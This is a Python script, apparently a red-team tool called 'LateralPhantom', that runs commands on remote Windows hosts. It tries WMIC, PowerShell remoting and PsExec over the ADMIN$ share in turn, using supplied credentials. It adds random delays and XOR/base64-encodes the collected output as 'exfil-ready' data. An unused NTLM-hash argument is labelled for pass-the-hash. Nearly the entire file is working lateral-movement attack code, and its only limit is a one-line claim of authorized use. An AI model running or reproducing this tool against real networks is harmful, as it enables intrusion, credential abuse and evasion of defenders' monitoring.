#!/usr/bin/env python3
# LateralPhantom.py - WMI + PowerShell Lateral Movement Framework (Pure LotL Red Team)
# Hand-coded for authorized testing only: WMI, WinRM, SMB execution, credential reuse
# EPO - Lab / Explicit Permission ONLY! 💀

import sys
import time
import random
import base64
import datetime
import subprocess
import argparse
import socket
import ctypes

# ================= CONFIG =================
DEFAULT_SLEEP_MIN = 2
DEFAULT_SLEEP_MAX = 10
XOR_KEY = 0xA7F2D9E3

# ================= UTILITY =================
def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def xor_obfuscate(data: str) -> str:
    bytes_data = data.encode()
    xored = bytes(b ^ (XOR_KEY & 0xFF) for b in bytes_data)
    return base64.b64encode(xored).decode()

def fake_delay(min_sec=1, max_sec=5):
    time.sleep(random.uniform(min_sec, max_sec))

# ================= LATERAL EXECUTION METHODS =================
def wmi_execute(target: str, cmd: str, username: str = None, password: str = None):
    """Execute command via WMI (WMIC)"""
    auth = ""
    if username and password:
        auth = f'/user:{username} /password:{password}'
    wmi_cmd = f'wmic {auth} /node:"{target}" process call create "{cmd}"'
    try:
        out = subprocess.check_output(wmi_cmd, shell=True, stderr=subprocess.STDOUT, timeout=30).decode(errors='ignore')
        return out.strip()
    except Exception as e:
        return f"WMI failed: {str(e)}"

def powershell_remoting(target: str, cmd: str, username: str = None, password: str = None):
    """Execute via PowerShell Remoting (WinRM)"""
    ps_cmd = f"$s = New-PSSession -ComputerName {target}"
    if username and password:
        ps_cmd += f" -Credential (New-Object PSCredential '{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force))"
    ps_cmd += f"; Invoke-Command -Session $s -ScriptBlock {{ {cmd} }}"
    try:
        out = subprocess.check_output(["powershell.exe", "-Command", ps_cmd], stderr=subprocess.STDOUT, timeout=30).decode(errors='ignore')
        return out.strip()
    except Exception as e:
        return f"WinRM failed: {str(e)}"

def smb_psexec_like(target: str, cmd: str, username: str = None, password: str = None):
    """Simple SMB exec stub (requires admin share)"""
    share = "ADMIN$"
    remote_cmd = f"cmd /c {cmd} > \\\\{target}\\{share}\\out.txt 2>&1"
    try:
        subprocess.call(f"net use \\\\{target}\\{share} /user:{username} {password}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.call(f"psexec \\\\{target} -s -d cmd /c {remote_cmd}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        out = subprocess.check_output(f"type \\\\{target}\\{share}\\out.txt", shell=True).decode(errors='ignore')
        subprocess.call(f"net use \\\\{target}\\{share} /delete", shell=True, stdout=subprocess.DEVNULL)
        return out.strip()
    except Exception as e:
        return f"SMB exec failed: {str(e)}"

# ================= MAIN EXECUTION =================
def execute_on_target(target: str, cmd: str, username: str = None, password: str = None, ntlm_hash: str = None):
    methods = [
        ("WMI", wmi_execute),
        ("PowerShell Remoting", powershell_remoting),
        ("SMB PsExec-like", smb_psexec_like)
    ]

    results = []
    for name, func in methods:
        fake_delay(1, 4)
        print(f"[{timestamp()}] Trying {name}...")
        result = func(target, cmd, username, password)
        results.append(f"[{name}] {result}")
        if "failed" not in result.lower():
            print(f"[{timestamp()}] Success via {name}")
            break

    output = "\n".join(results)
    obfuscated = xor_obfuscate(output)
    print(f"[{timestamp()}] Raw result:\n{output}")
    print(f"[{timestamp()}] Exfil-ready (base64+XOR):\n{obfuscated}")

    return output

# ================= ARGUMENT PARSER =================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LateralPhantom - LotL Lateral Movement")
    parser.add_argument("action", choices=["execute"], help="Action: execute")
    parser.add_argument("target", help="Target IP/hostname")
    parser.add_argument("command", help="Command to run remotely")
    parser.add_argument("--username", help="Domain\\username")
    parser.add_argument("--password", help="Password")
    parser.add_argument("--ntlm-hash", help="NTLM hash for PtH")
    parser.add_argument("--verbose", "-v", action="store_true")

    args = parser.parse_args()

    print(f"[{timestamp()}] LateralPhantom starting - target: {args.target}")
    print(f"[{timestamp()}] Command: {args.command}")

    if not args.username and not args.ntlm_hash:
        print(f"[{timestamp()}] Warning: No credentials provided - may fail")

    execute_on_target(
        args.target,
        args.command,
        args.username,
        args.password,
        args.ntlm_hash
    )

    print(f"[{timestamp()}] Execution complete")